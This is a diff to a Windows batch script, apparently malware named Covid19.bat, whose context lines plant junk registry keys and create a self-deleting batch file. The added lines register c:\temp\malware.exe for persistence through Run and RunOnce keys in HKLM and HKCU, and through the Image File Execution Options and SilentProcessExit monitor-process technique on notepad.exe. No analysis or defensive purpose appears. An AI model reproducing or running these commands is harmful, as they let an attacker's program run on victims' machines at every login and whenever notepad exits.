@@ -27,6 +27,13 @@ setlocal
 reg add HKLM\Software\Malware /v Covid19 /t REG_SZ /f
 reg add HKLM\Software\Important /v Covid19 /t REG_SZ /f
 reg add HKLM\Software\YourPPSmol /v Covid19 /t REG_SZ /f
+reg add HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe /v GlobalFlag /t REG_DWORD /d 0x200
+reg add HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe /v ReportingMode /t REG_DWORD /d 0x1
+reg add HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe /v MonitorProcess /t REG_SZ /d c:\temp\malware.exe
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /t REG_SZ /d c:\temp\malware.exe
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Malware /t REG_SZ /d c:\temp\malware.exe
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /t REG_SZ /d c:\temp\malware.exe
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Malware /t REG_SZ /d c:\temp\malware.exe
 
 ECHO del Covid19.bat > "C:\Users\User\Documents\NotCovid19.txt"
 copy "C:\Users\User\Documents\NotCovid19.txt" "C:\Users\User\Documents\Covid19.bat"
